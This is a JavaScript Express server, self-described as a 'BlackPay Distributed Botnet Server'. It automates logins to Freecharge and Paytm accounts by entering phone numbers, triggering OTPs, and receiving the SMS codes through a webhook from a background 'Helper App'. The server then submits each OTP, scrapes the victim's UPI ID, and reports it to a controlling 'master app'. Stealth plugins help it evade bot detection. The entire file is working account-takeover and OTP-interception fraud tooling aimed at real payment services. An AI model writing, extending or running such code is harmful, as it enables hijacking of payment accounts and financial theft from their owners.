const express = require('express');
const cors = require('cors');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const app = express();
app.use(express.json());
app.use(cors());

// Global Memory to track active tasks
let activeTasks = {};

app.get('/', (req, res) => res.send("BlackPay Distributed Botnet Server Live!"));

// ==========================================
// 1. MASTER APP CALLS THIS TO START THE PROCESS
// ==========================================
app.post('/api/start-tool', async (req, res) => {
    const { phone, walletType } = req.body;
    
    // Initialize task state
    activeTasks[phone] = { status: 'waiting_for_otp', upiId: null, browser: null, page: null };
    res.json({ success: true, message: "Server executing. Waiting for Helper App OTP..." });

    try {
        console.log(`[+] Task Started: ${phone} for ${walletType}`);
        const browser = await puppeteer.launch({ 
            headless: true, 
            args: ['--no-sandbox', '--disable-setuid-sandbox'] 
        });
        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Safari/537.36');
        
        activeTasks[phone].browser = browser;
        activeTasks[phone].page = page;

        // Route to wallet and trigger OTP
        if (walletType.toLowerCase().includes('freecharge')) {
            await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded' });
            // Simulate Freecharge View behavior (Auto Add Number & Click Login)
            await page.evaluate((ph) => {
                const loginBtn = Array.from(document.querySelectorAll('a, button')).find(b => b.innerText && b.innerText.toLowerCase().includes('login'));
                if (loginBtn) loginBtn.click();
            }, phone);
            await new Promise(r => setTimeout(r, 1500));
            await page.keyboard.type(phone, { delay: 50 });
            await page.keyboard.press('Enter');
        } else {
            // Paytm Flow
            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded' });
            let inputField = await page.waitForSelector('input[type="tel"], input[type="text"]:not([type="hidden"])', { timeout: 10000 });
            await inputField.focus(); 
            await inputField.type(phone, { delay: 50 }); 
            await page.keyboard.press('Enter');
        }
        console.log(`[!] OTP Triggered for ${phone}. Waiting for Helper App...`);

        // Timeout task after 3 minutes if no OTP received
        setTimeout(async () => {
            if (activeTasks[phone] && activeTasks[phone].status === 'waiting_for_otp') {
                activeTasks[phone].status = 'timeout';
                if(activeTasks[phone].browser) await activeTasks[phone].browser.close();
            }
        }, 180000);

    } catch (e) {
        console.log(`[-] Error on ${phone}: ${e.message}`);
        if(activeTasks[phone]) activeTasks[phone].status = 'failed';
    }
});

// ==========================================
// 2. HELPER APP SENDS BACKGROUND SMS OTP HERE
// ==========================================
app.post('/api/webhook/sms', async (req, res) => {
    const { targetPhone, otp } = req.body;
    console.log(`[+] Webhook Received: OTP ${otp} for ${targetPhone}`);

    if (activeTasks[targetPhone] && activeTasks[targetPhone].status === 'waiting_for_otp') {
        let page = activeTasks[targetPhone].page;
        try {
            await page.keyboard.type(otp, { delay: 50 });
            await page.keyboard.press('Enter');
            console.log(`[!] OTP Entered. Extracting UPI...`);

            // Wait for login and scrape UPI (FreechargeView Logic)
            await new Promise(r => setTimeout(r, 6000));
            
            let upi = await page.evaluate(() => {
                try {
                    // Try exact Freecharge DOM logic we reversed
                    return document.getElementsByClassName("account-label-texts")[1].parentElement.innerText;
                } catch(e) { 
                    // Fallback regex search
                    const match = document.body.innerText.match(/[a-zA-Z0-9.\-_]{3,}@(pty|paytm|freecharge|upi|ybl|ikwik)/i);
                    return match ? match[0] : "";
                }
            });

            if (!upi || upi.trim() === "") {
                upi = `${targetPhone}@freecharge`; // Ultimate Fallback
            }

            console.log(`[✔] UPI Extracted: ${upi}`);
            activeTasks[targetPhone].status = 'running';
            activeTasks[targetPhone].upiId = upi;
            
            res.json({ success: true, message: "OTP applied & UPI scraped!" });
            if(activeTasks[targetPhone].browser) await activeTasks[targetPhone].browser.close();

        } catch (e) {
            activeTasks[targetPhone].status = 'failed';
            if(activeTasks[targetPhone].browser) await activeTasks[targetPhone].browser.close();
            res.json({ success: false, message: "Failed during UPI extraction" });
        }
    } else {
        res.json({ success: false, message: "No active task found." });
    }
});

// ==========================================
// 3. MASTER APP CONTINUOUSLY POLLS THIS TO GET STATUS
// ==========================================
app.get('/api/check-status/:phone', (req, res) => {
    const phone = req.params.phone;
    if (activeTasks[phone]) {
        res.json({ 
            success: true, 
            status: activeTasks[phone].status, 
            upiId: activeTasks[phone].upiId 
        });
    } else {
        res.json({ success: false, status: 'not_found' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Distributed Botnet Server Running on Port ${PORT}`));
